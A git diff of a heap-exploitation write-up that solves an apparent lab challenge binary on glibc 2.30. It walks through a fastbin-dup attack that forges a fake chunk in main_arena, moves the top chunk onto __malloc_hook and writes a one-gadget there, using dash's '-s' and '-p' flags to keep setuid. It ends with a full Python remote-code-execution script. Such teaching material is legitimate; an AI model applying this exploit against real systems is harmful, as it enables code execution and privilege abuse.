@@ -202,7 +202,12 @@ This chunk resides 35 bytes before our `__malloc_hook` symbol.
 
 Because the new chunk's size is `0x7f`, we would have to change our malloc requests so they will land at the `0x70` fastbin.
 
-By executing `one_gadget`, we can find candidates to replace the `__malloc_hook` call.
+By executing `one_gadget`, we can find candidates to overwrite `__malloc_hook`.
+
+
+
+Note: watch out for incompatible flags in the fake `size` fields. \
+In case `NON_MAIN_ARENA` is set (1), along with `CHUNK_IS_MMAPPED` cleared (0), a segfault would generate - as malloc attempts to locate non-existent arena. 
 
 Shell POC:
 
@@ -238,4 +243,146 @@ malloc(1, b"")
 
 ## Challenge
 
+The binary is 64-bit, glibc 2.30 binary. \
+`checksec`:
 
+```bash
+Arch:     amd64-64-little
+    RELRO:    Full RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      PIE enabled
+    RUNPATH:  b'../.glibc/glibc_2.30_no-tcache'
+```
+
+We do have a libc leak. \
+It is possible to only allocat `fastbin` chunks, excluding 0x70 sized.
+
+### Hook Candidate
+
+First first goal is to find a good __hook symbol. 
+
+All of `__realloc_hook, __malloc_hook, __memalign_hook` contained a single possible fastbin chunk, but its size field is 0x7f - meaning it resides within the 0x70 fastbin - which we cannot allocate.
+
+My idea consist of two stages. \
+First: we have to corrupt the top chunk of the heap. 
+
+By examining the `main_arena` content, i've noticed it is possible to initialize the fastbins, thus creating candidates for `find_fake_fast` - meaning the top chunk would be able to serve as a fake chunk, which we can corrupt.
+
+```bash
+pwndbg> x/30gx &main_arena
+0x7ffff7dd0b60 <main_arena>:    0x0000000000000000      0x0000000000000001
+0x7ffff7dd0b70 <main_arena+16>: 0x00005555556031a0      0x0000555555603170
+0x7ffff7dd0b80 <main_arena+32>: 0x0000555555603130      0x00005555556031c0
+0x7ffff7dd0b90 <main_arena+48>: 0x0000555555603080      0x0000000000000000
+0x7ffff7dd0ba0 <main_arena+64>: 0x0000555555603000      0x0000000000000000
+0x7ffff7dd0bb0 <main_arena+80>: 0x0000000000000000      0x0000000000000000
+0x7ffff7dd0bc0 <main_arena+96>: 0x0000555555603210      0x0000000000000000
+0x7ffff7dd0bd0 <main_arena+112>:        0x00007ffff7dd0bc0      0x00007ffff7dd0bc0
+0x7ffff7dd0be0 <main_arena+128>:        0x00007ffff7dd0bd0      0x00007ffff7dd0bd0
+0x7ffff7dd0bf0 <main_arena+144>:        0x00007ffff7dd0be0      0x00007ffff7dd0be0
+0x7ffff7dd0c00 <main_arena+160>:        0x00007ffff7dd0bf0      0x00007ffff7dd0bf0
+0x7ffff7dd0c10 <main_arena+176>:        0x00007ffff7dd0c00      0x00007ffff7dd0c00
+0x7ffff7dd0c20 <main_arena+192>:        0x00007ffff7dd0c10      0x00007ffff7dd0c10
+0x7ffff7dd0c30 <main_arena+208>:        0x00007ffff7dd0c20      0x00007ffff7dd0c20
+0x7ffff7dd0c40 <main_arena+224>:        0x00007ffff7dd0c30      0x00007ffff7dd0c30
+```
+
+The top chunk is located at `0x0000555555603210`. \
+While `find_fake_top` finds chunks with `size = 0x55`, they aren't suitable, as their flags would trigger a segfault (non main arena, non mmapped chunk). 
+
+However - while usually the fastbin head pointers at the arena are pointing towards the heap, within the fastbin dup technique, the last pointer at that bin is controlled by us, for example:
+
+```bash
+0x30: 0x603030 —▸ 0x603000 —▸ 0x602010 (user) ◂— 0x58585858585858 /* 'XXXXXXX' */
+```
+
+It means that once we malloc the 3 "regular" chunks, the pointer at the `main_arena` representing the head of the 0x30 fastbin, contains the value of `0x58585858585858` - hence completely attacker controlled.
+
+Therefore, my idea is to forge the following heap layout:
+
+```bash
+pwndbg> x/30gx &main_arena
+0x7ffff7dd0b60 <main_arena>:    0x0000000000000000      0x0000000000000000
+0x7ffff7dd0b70 <main_arena+16>: 0x0000000000000000      0x0000000000000000
+0x7ffff7dd0b80 <main_arena+32>: 0x0000000000000000      0x0000000000000061 (bin0x50)
+0x7ffff7dd0b90 <main_arena+48>: 0x00007ffff7dd0b80      0x0000000000000000
+0x7ffff7dd0ba0 <main_arena+64>: 0x0000000000000000      0x0000000000000000
+0x7ffff7dd0bb0 <main_arena+80>: 0x0000000000000000      0x0000000000000000
+0x7ffff7dd0bc0 <main_arena+96>: 0x0000555555603210      0x0000000000000000
+```
+
+I will overwrite the head of `fastbin[0x50]` to `0x0000000000000061`, and the head of `fastbin[0x60]` to its own address minus 16 bytes.
+
+That way, upon requesting a `malloc(0x58)`, it will attempt to allocate it from the 0x60 fastbin. \
+Because the relevant free chunk is overwritten to `0x00007ffff7dd0b80`, its size field corresponds to `0x0000000000000061` - passing the fastbin size mitigation.
+
+The address of `0x7ffff7dd0b90` and 0x58 bytes beyond, are considered as part of the `user_content` - so they will be writeable!
+
+Since `0x0000555555603210` represents the pointer of the top chunk, i will be able to overwrite it - with (approximally) the address of `__malloc_hook`. 
+
+Unlike fastbins, allocations from the top chunk do not have the "correct fastbin index" mitigation (duh).
+There is a check is that the size of the top chunk is large enough.
+
+Note, that there is also the following check for the top_chunk size:
+
+```c
+if (__glibc_unlikely (size > av->system_mem))
+  malloc_printerr ("malloc(): corrupted top size");
+```
+
+Because `__malloc_hook` is surrounded by large pointers prior to it, we can easily forge a correct top chunk. 
+We only have to make sure to give a certain offset, so the upper `size` mitigation won't apply. 
+
+The `__malloc_hook` can then be easily overwritten with a one-gadget. \
+However, during executing the hook, we meet non of the one-gadget constraints!
+
+By browsing the `dash` manual page, we can see there is a possible trick. By stating a `-s` flag, the shell reads commands from stdin, which is equivalent to `argv[0] == NULL` - exactly what we want.
+
+Another trick with `dash` is passing the `-p` flag, keeping the suid bit of the shell on.
+
+Full RCE PoC:
+
+```python
+# Request two 0x50-sized chunks.
+chunk_A = malloc(0x48, b"A"*8)
+chunk_B = malloc(0x48, b"B"*8)
+
+# Free the first chunk, then the second.
+free(chunk_A)
+free(chunk_B)
+free(chunk_A)
+
+# Write the quadword 0x61 at the main arena
+malloc(0x48, p64(0x61))
+# Request two more chunks, so the head of the 0x50 fastbin is now user controlled (0x61)
+malloc(0x48, b"C"*8)
+malloc(0x48, b"D"*8)
+
+# Request two 0x60-sized chunks.
+chunk_C = malloc(0x58, b"E"*8)
+chunk_D = malloc(0x58, b"F"*8)
+
+free(chunk_C)
+free(chunk_D)
+free(chunk_C)
+
+# Set the fake chunk address
+fake_chunk = p64(libc.sym.main_arena + 32)
+malloc(0x58, fake_chunk)
+
+# Request two allocations for setting a new head for the 0x60 fastbin
+# This apperently controls argv[1], set it to "-s" to ignore bad pathnames
+malloc(0x58, b"-s\x00")
+malloc(0x58, b"Y"*8)
+
+# set top chunk to point to __malloc_hook. Added 4, so its size field wont be too large
+new_top = p64(libc.sym.__malloc_hook - 40 + 4)
+malloc(0x58, b"H"*48 + new_top)
+
+# overwrite __malloc_hook with one gadget. Note there is no fastbin[0x40], so allocations will be made by the top chunk
+malloc(0x28, b"A"*20 + p64(libc.address + 0xe1fa1))
+
+# trigger malloc_hook
+malloc(0x18, b"AAAA")
+```
